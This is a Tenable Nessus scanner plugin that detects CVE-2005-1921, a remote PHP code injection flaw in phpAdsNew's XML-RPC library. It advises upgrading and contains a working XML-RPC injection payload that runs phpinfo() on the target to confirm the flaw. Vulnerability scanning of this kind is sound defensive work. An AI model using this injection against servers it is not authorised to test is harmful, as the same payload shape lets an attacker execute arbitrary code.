#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to arbitrary
code execution. 

Description :

The remote host appears to be running phpAdsNew, an open-source ad
server written in PHP. 

The version of phpAdsNew installed on the remote host allows attackers
to execute arbitrary PHP code subject to the privileges of the web
server user id due to a flaw in its bundled XML-RPC library. 

See also :

http://www.gulftech.org/?node=research&article_id=00087-07012005
http://phpadsnew.com/two/nucleus/index.php?itemid=45

Solution :

Upgrade to phpAdsNew 2.0.5 or later. 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20180);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2005-1921");
  script_bugtraq_id(14088);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17793");
  }

  script_name(english:"phpAdsNew XML-RPC Library Remote Code Injection Vulnerability");
  script_summary(english:"Checks for remote code injection vulnerability in phpAdsNew XML-RPC library");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs()) {
  # Check whether the script exists.
  req = http_get(item:string(dir, "/adxmlrpc.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("<methodResponse>" >< res) {
    # Try to exploit the flaw to run phpinfo().
    postdata = string(
      '<?xml version="1.0"?>',
      "<methodCall>",
      "<methodName>system.listMethods</methodName>",
        "<params>",
          "<param><value><name>','')); phpinfo();exit;/*</name></value></param>",
        "</params>",
      "</methodCall>"
    );
    req = string(
      "POST ", dir, "/adxmlrpc.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: text/xml\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like the output of phpinfo().
    if ("PHP Version" >< res) {
      if (report_verbosity > 0) {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          res
        );
      }
      else report = desc;

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
